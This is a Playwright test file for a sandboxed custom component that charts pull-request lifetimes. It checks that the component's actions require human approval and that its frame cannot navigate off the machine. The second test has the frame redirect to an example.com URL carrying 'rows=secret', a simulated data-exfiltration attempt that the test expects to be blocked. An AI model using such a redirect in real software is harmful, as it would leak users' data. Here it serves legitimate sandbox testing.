import type { Page } from "@playwright/test";

import { approveCollector, approveProgram, ipc, run, until, type Daemon } from "../../support/daemon.js";
import { expect, test } from "../../support/fixtures.js";
import { openFromLauncher } from "../../support/ui.js";

// The github example's PR Lifetimes (P11, tsk962): the custom component
// that made `custom_components` stable, in its sandboxed frame — in
// Chromium and WebKit, the engines oxplow's browser mode and its macOS
// window run. Every suite daemon has the example, its sync printing the
// suite's two pull requests (#12 merged, #13 open).

/** Collect the pull requests and open the lens. */
async function openLifetimes(page: Page, daemon: Daemon) {
  await approveCollector(daemon, "github", "prs");
  await run(daemon, "collector.sync", { owner: "github", id: "prs" });
  await until("the pull requests to be collected", 30_000, async () => {
    const out = await ipc<{ rows: unknown[][] }>(daemon, "query_sql", { sql: "SELECT count(*) FROM v_github_pr" }).catch(
      () => ({ rows: [[0]] }),
    );
    return out.rows[0]?.[0] === 2;
  });
  await page.goto("/");
  await openFromLauncher(page, "PR Lifetimes");
  const frame = page.frameLocator('[data-testid="custom-component-frame"]');
  await expect(frame.locator(".bar")).toHaveCount(2);
  return frame;
}

test("PR lifetimes draws, filters and opens; it acts only once a person approves it", async ({ fresh }) => {
  const { page, daemon } = fresh;
  const frame = await openLifetimes(page, daemon);
  await expect(page.getByTestId("custom-component-badge")).toHaveText("custom");

  // Its filters re-run its own lens.
  await frame.locator('[data-state="open"]').click();
  await expect(frame.locator(".bar")).toHaveCount(1);
  await expect(frame.locator(".bar")).toHaveAttribute("data-ref", "github_pr:13");
  await frame.locator('[data-state="all"]').click();
  await expect(frame.locator(".bar")).toHaveCount(2);

  // It runs the sync with the person's rights: refused until it's approved,
  // and oxplow says why beside the frame, whatever the frame shows.
  await frame.locator("#sync").click();
  await expect(page.getByTestId("custom-component-refused")).toContainText("component `github/pr-lifetimes`");
  await expect(frame.locator("#status")).toContainText("approval");
  await approveProgram(daemon, "component", "github/pr-lifetimes");
  await frame.locator("#sync").click();
  await expect(frame.locator("#status")).toHaveText("Synced.");
  await expect(page.getByTestId("custom-component-refused")).toHaveCount(0);

  // A bar opens its pull request's page.
  await frame.locator('[data-ref="github_pr:12"] rect').click();
  await expect(page.getByText("#12 Fix the hover state").first()).toBeVisible();
});

test("a component's frame can't navigate itself off this machine", async ({ fresh }) => {
  const { page, daemon } = fresh;
  await openLifetimes(page, daemon);
  const left: string[] = [];
  page.on("request", (r) => {
    if (r.url().startsWith("http://example.com")) left.push(r.url());
  });
  await page.route("http://example.com/**", (route) => route.abort());
  const bundle = page.frames().find((f) => f.url().includes("/components/"));
  expect(bundle).toBeDefined();
  await bundle!.evaluate(() => {
    location.href = "http://example.com/out?rows=secret";
  });
  // The page's frame bound refuses it before any request goes out; the
  // engine's own "blocked" page is the frame's second load, which ends the
  // component — its table shows instead.
  await expect(page.getByTestId("custom-component-fallback")).toContainText("navigated away");
  expect(left).toEqual([]);
});
